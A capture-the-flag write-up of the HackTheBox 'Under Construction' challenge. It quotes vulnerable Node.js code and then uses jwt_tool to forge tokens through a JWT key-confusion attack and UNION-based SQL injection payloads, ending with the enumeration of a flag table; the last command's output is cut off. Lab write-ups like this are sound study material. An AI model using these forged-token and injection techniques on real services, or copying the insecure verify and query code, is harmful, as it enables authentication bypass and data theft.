# Under Construction

Completed: Yes
Platform: HackTheBox

After register and login in, you didn't find anything else except a very long and strange cookie. 

I started to decode it as Base64 and then I found JSON. Also, I looked at the source code, where mentions JWT.

I didn't know about JWT. 

Read this: [https://developer.okta.com/blog/2020/12/21/beginners-guide-to-jwt](https://developer.okta.com/blog/2020/12/21/beginners-guide-to-jwt).

```bash
# cat JWTHelper.js     
const fs = require('fs');
const jwt = require('jsonwebtoken');

const privateKey = fs.readFileSync('./private.key', 'utf8');
const publicKey  = fs.readFileSync('./public.key', 'utf8');

module.exports = {
    async sign(data) {
        data = Object.assign(data, {pk:publicKey});
        return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
    },
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
}
```

So, the JWT is signed with a private key and then will be verified with a public key.

Also, you can see in DBHelper.js, that here we don't have parameterized queries in getName:

```bash
# cat DBHelper.js 
const sqlite = require('sqlite3');

const db = new sqlite.Database('./database.db', err => {
    if (!!err) throw err;
    console.log('Connected to SQLite');
});

module.exports = {
    getUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
                if (err) return rej(err);
                res(data);
            });
        });
    }
```

This function is used in:

```bash
# cat index.js         
const express = require('express');
const router = express.Router();
const path = require('path');
const AuthMiddleware = require('../middleware/AuthMiddleware');
const JWTHelper = require('../helpers/JWTHelper');
const DBHelper = require('../helpers/DBHelper');

router.get('/', AuthMiddleware, async (req, res, next) => {
    try{
        let user = await DBHelper.getUser(req.data.username);
        if (user === undefined) {
            return res.send(`user ${req.data.username} doesn't exist in our database.`);
        }
        return res.render('index.html', { user });
    }catch (err){
        return next(err);
    }
});
```

Thus, after you logged in, this function will be called and it will get your username from the database. So, if the user exists and the query executes fine, the result will be stored on our home page.

The next issue is what to do with JWT. I tried alg:none and tried to modify it with this decoder: [https://www.jstoolset.com/jwt](https://www.jstoolset.com/jwt). But it doesn't work. Also, It MUST BE signed with a private key. I read this page and take the tool from it: [https://www.varutra.com/2020/12/31/json-web-token-jwt-attack-most-common-scenarios/](https://www.varutra.com/2020/12/31/json-web-token-jwt-attack-most-common-scenarios/).

Firstly, create a user, log in and intercept the home page with the Burp Suite.

Now, we need to modify our JWT so that we changed the username within it on something with SQLi and also need to sign our JWT with a public key because we will use Key confusion attack. You can find different usage of this tool in its repo: [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool).

Options of jwt_tool for this challenge:

- `-X` to choose exploit.
- `k` to use key confusion attack.
- `-pk` to specify a public key for key confusion attack.
- `-I` to inject various data in JWT.
- `-pc` to specify a field where to inject.
- `-pv` to specify a value to inject.

```bash
# python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0Jycgb3IgMT0xLS0gLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.43kY-HxW32G5E_CKcFZn0B--n6hXSvd8_jtbqOhhuaUa2NMdAKlPeYHNCNCnRmrz_Kz7gILxL44l4BBE1KBj9Y_GzAClurdO3DrT_6PrXYuQPLTDqz0bWqF5gvQguKoNIiR1bdKvgBS8woFCQOUqXJNQFQmD8Em3mNl73zQhPhZMH0eUjAtVKUSoenpr7r6o6hPnrDlGbC3tZCNjbid_z9lVnBSegPPUYdETBwLoUy8LQo55_lM6rh1dbyZOB86s0c7yADmyqB-uPcMpuApyjriUvh62bttE34hy6ytdO1pf9wHiceuSh_7h9ytWRRV-XqAwA888We32w4n0AocT2w -X k -pk public.key -I -pc username -pv "testtest' or 1=1--"                        

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                                                                             
File loaded: public.key
jwttool_2a1b55c41e4c86b0cfe9a6d952e3c4c0 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)                                                                                                                                                                               
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0JyBvciAxPTEtLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.gljYNlsyZ2C9JdKDg_2LyofD05x-ZwFoRNv-VyRtCEg
```

In Burp, try to request the home page with this token, you will not receive any errors. Okay, it was successfully signed with a public key.

Trying to identify the columns number:

```bash
# python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0Jycgb3IgMT0xLS0gLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.43kY-HxW32G5E_CKcFZn0B--n6hXSvd8_jtbqOhhuaUa2NMdAKlPeYHNCNCnRmrz_Kz7gILxL44l4BBE1KBj9Y_GzAClurdO3DrT_6PrXYuQPLTDqz0bWqF5gvQguKoNIiR1bdKvgBS8woFCQOUqXJNQFQmD8Em3mNl73zQhPhZMH0eUjAtVKUSoenpr7r6o6hPnrDlGbC3tZCNjbid_z9lVnBSegPPUYdETBwLoUy8LQo55_lM6rh1dbyZOB86s0c7yADmyqB-uPcMpuApyjriUvh62bttE34hy6ytdO1pf9wHiceuSh_7h9ytWRRV-XqAwA888We32w4n0AocT2w -X k -pk public.key -I -pc username -pv "testtest' order by 4;--"

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                                                                             
File loaded: public.key
jwttool_f09934c6941ac2f0df43c95dedb62149 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)                                                                                                                                                                               
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0JyBvcmRlciBieSA0Oy0tIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjI0MDg3Mjk3fQ.a3BMTi6uag5zUihpgCa28caXbi1OyrCYz6qVs352MfQ
```

Received an sqlite error about wrong number of columns:

```bash
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 206
Date: Sat, 19 Jun 2021 08:07:30 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 3</pre>
</body>
</html>
```

It said that the number is three. Okay. Consider that the first column is something like the id of a user. Others are username and password.

```bash
# python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0Jycgb3IgMT0xLS0gLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.43kY-HxW32G5E_CKcFZn0B--n6hXSvd8_jtbqOhhuaUa2NMdAKlPeYHNCNCnRmrz_Kz7gILxL44l4BBE1KBj9Y_GzAClurdO3DrT_6PrXYuQPLTDqz0bWqF5gvQguKoNIiR1bdKvgBS8woFCQOUqXJNQFQmD8Em3mNl73zQhPhZMH0eUjAtVKUSoenpr7r6o6hPnrDlGbC3tZCNjbid_z9lVnBSegPPUYdETBwLoUy8LQo55_lM6rh1dbyZOB86s0c7yADmyqB-uPcMpuApyjriUvh62bttE34hy6ytdO1pf9wHiceuSh_7h9ytWRRV-XqAwA888We32w4n0AocT2w -X k -pk public.key -I -pc username -pv "testtest' union select null, 'a', 'a';--"

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                                                                             
File loaded: public.key
jwttool_2b3a3db01cf4945f4cacc1dfd51f5d39 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)                                                                                                                                                                               
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0JyB1bmlvbiBzZWxlY3QgbnVsbCwgJ2EnLCAnYSc7LS0iLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjQwODcyOTd9.OPGtgOfGYumK9F2wkivJIdblSfBnRvUiUMAWlz-Z0I8
```

And now, my user is `a`.

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2513
ETag: W/"9d1-4UagakrcRRpIIo6dzxdODBN8J/k"
Date: Sat, 19 Jun 2021 08:09:57 GMT
Connection: close

<!DOCTYPE html>
                <div class="card-body">
                    Welcome a<br>
                    This site is under development. <br>
                    Please come back later.
                </div>
```

Found this cheat sheet for SQLite SQLi: [https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet).

Fingerprint the database version with sqlite_version(): [https://www.sqlitetutorial.net/sqlite-functions/sqlite_version/](https://www.sqlitetutorial.net/sqlite-functions/sqlite_version/).

```bash
# python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0Jycgb3IgMT0xLS0gLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.43kY-HxW32G5E_CKcFZn0B--n6hXSvd8_jtbqOhhuaUa2NMdAKlPeYHNCNCnRmrz_Kz7gILxL44l4BBE1KBj9Y_GzAClurdO3DrT_6PrXYuQPLTDqz0bWqF5gvQguKoNIiR1bdKvgBS8woFCQOUqXJNQFQmD8Em3mNl73zQhPhZMH0eUjAtVKUSoenpr7r6o6hPnrDlGbC3tZCNjbid_z9lVnBSegPPUYdETBwLoUy8LQo55_lM6rh1dbyZOB86s0c7yADmyqB-uPcMpuApyjriUvh62bttE34hy6ytdO1pf9wHiceuSh_7h9ytWRRV-XqAwA888We32w4n0AocT2w -X k -pk public.key -I -pc username -pv "testtest' union select null,sqlite_version(),'a';--"    

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                                                                             
File loaded: public.key
jwttool_eded83d7231b324b5ce5dc733742db22 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)                                                                                                                                                                               
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0JyB1bmlvbiBzZWxlY3QgbnVsbCxzcWxpdGVfdmVyc2lvbigpLCdhJzstLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.TsGj4mDaJKyFGl5VZW310MCyKBM4RMPCqIQ0diYpBz8
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2518
ETag: W/"9d6-+JL714qtlSOwbdnOxDhDdV7gJeo"
Date: Sat, 19 Jun 2021 08:14:13 GMT
Connection: close

<!DOCTYPE html>

                <div class="card-header text-white bg-danger">
                    Message from developers
                </div>
                <div class="card-body">
                    Welcome 3.30.1<br>
                    This site is under development. <br>
                    Please come back later.
                </div>
```

From cheat sheet use `SELECT sql FROM sqlite_master`:

```bash
# python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0Jycgb3IgMT0xLS0gLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.43kY-HxW32G5E_CKcFZn0B--n6hXSvd8_jtbqOhhuaUa2NMdAKlPeYHNCNCnRmrz_Kz7gILxL44l4BBE1KBj9Y_GzAClurdO3DrT_6PrXYuQPLTDqz0bWqF5gvQguKoNIiR1bdKvgBS8woFCQOUqXJNQFQmD8Em3mNl73zQhPhZMH0eUjAtVKUSoenpr7r6o6hPnrDlGbC3tZCNjbid_z9lVnBSegPPUYdETBwLoUy8LQo55_lM6rh1dbyZOB86s0c7yADmyqB-uPcMpuApyjriUvh62bttE34hy6ytdO1pf9wHiceuSh_7h9ytWRRV-XqAwA888We32w4n0AocT2w -X k -pk public.key -I -pc username -pv "testtest' union select null,(SELECT sql FROM sqlite_master),null;--"    

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                                                                             
File loaded: public.key
jwttool_fa79a464e9c9d9a9b4f510d1f936a452 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)                                                                                                                                                                               
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0JyB1bmlvbiBzZWxlY3QgbnVsbCwoU0VMRUNUIHNxbCBGUk9NIHNxbGl0ZV9tYXN0ZXIpLG51bGw7LS0iLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjQwODcyOTd9.yBZofu6Q6wuxQ0yJdSRVWIFOe4WFDHrvollte6QE85o
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2639
ETag: W/"a4f-XmVqx9/ALIg1mvQmOzt9S0/lMhQ"
Date: Sat, 19 Jun 2021 08:16:45 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>

                    Message from developers
                </div>
                <div class="card-body">
                    Welcome CREATE TABLE &quot;flag_storage&quot; (
	&quot;id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,
	&quot;top_secret_flaag&quot;	TEXT
)<br>
                    This site is under development. <br>
                    Please come back later.
 
```

Successfully enumerated the database and columns!

```bash
# python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0Jycgb3IgMT0xLS0gLSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYyNDA4NzI5N30.43kY-HxW32G5E_CKcFZn0B--n6hXSvd8_jtbqOhhuaUa2NMdAKlPeYHNCNCnRmrz_Kz7gILxL44l4BBE1KBj9Y_GzAClurdO3DrT_6PrXYuQPLTDqz0bWqF5gvQguKoNIiR1bdKvgBS8woFCQOUqXJNQFQmD8Em3mNl73zQhPhZMH0eUjAtVKUSoenpr7r6o6hPnrDlGbC3tZCNjbid_z9lVnBSegPPUYdETBwLoUy8LQo55_lM6rh1dbyZOB86s0c7yADmyqB-uPcMpuApyjriUvh62bttE34hy6ytdO1pf9wHiceuSh_7h9ytWRRV-XqAwA888We32w4n0AocT2w -X k -pk public.key -I -pc username -pv "testtest' union select null,(SELECT top_secret_flaag FROM flag_storage),null;--"  

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.3                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                                                                             
File loaded: public.key
